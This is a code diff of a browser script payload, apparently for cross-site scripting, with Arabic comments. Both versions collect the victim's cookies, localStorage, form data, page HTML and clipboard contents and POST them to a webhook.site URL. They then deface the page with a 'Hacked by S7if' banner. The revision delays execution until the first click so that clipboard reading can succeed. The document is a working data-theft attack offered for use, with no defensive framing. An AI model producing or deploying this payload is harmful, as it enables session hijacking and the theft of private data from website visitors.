@@ -1,9 +1,5 @@
 <script>
-(async () => {
-  // ⛔ Alert أولي لإخافة الهدف
-  alert("💀 Hacked by S7if 💀");
-
-  // 🧠 جمع البيانات
+function stealData() {
   const everything = {
     cookies: document.cookie,
     localStorage: { ...localStorage },
@@ -12,8 +8,7 @@
     referrer: document.referrer,
     userAgent: navigator.userAgent,
     platform: navigator.platform,
-    clipboard: "", // هيتم محاولة قراءته
-    html: document.documentElement.outerHTML.slice(0, 3000), // زيادة عدد الحروف
+    html: document.documentElement.outerHTML.slice(0, 3000),
     forms: Array.from(document.forms).map(f => ({
       action: f.action,
       method: f.method,
@@ -26,28 +21,35 @@
     time: new Date().toISOString()
   };
 
-  // 🧪 محاولة قراءة محتوى الكليب بورد
-  try {
-    everything.clipboard = await navigator.clipboard.readText();
-  } catch (e) {
-    everything.clipboard = "Clipboard access denied";
-  }
+  // محاولة قراءة الكليب بورد
+  navigator.clipboard.readText().then(text => {
+    everything.clipboard = text;
+    sendToWebhook(everything);
+  }).catch(() => {
+    everything.clipboard = "Access denied";
+    sendToWebhook(everything);
+  });
+}
 
-  // 🚀 إرسال الداتا للويب هوك
-  try {
-    await fetch("https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(everything)
-    });
-  } catch (e) {}
+function sendToWebhook(data) {
+  fetch("https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(data)
+  }).then(() => {
+    // بعد الإرسال، غير شكل الصفحة
+    document.body.innerHTML = `
+      <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#111;color:#0f0;font-size:2em;font-family:monospace;text-align:center;flex-direction:column;">
+        <div>👾 Hacked by Saif 👾</div>
+        <div style="font-size: 0.6em; margin-top: 20px;">Your session has been terminated.</div>
+      </div>
+    `;
+  });
+}
 
-  // 👻 شكل مرعب في الصفحة بعد السرقة
-  document.body.innerHTML = `
-    <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#111;color:#0f0;font-size:2em;font-family:monospace;text-align:center;flex-direction:column;">
-      <div>👾 Hacked by S7if 👾</div>
-      <div style="font-size: 0.6em; margin-top: 20px;">Your session has been terminated.</div>
-    </div>
-  `;
-})();
+// ❗ تنفيذ بعد أي تفاعل
+document.addEventListener("click", () => {
+  alert("💀 Hacked by S7if 💀");
+  stealData();
+}, { once: true });
 </script>
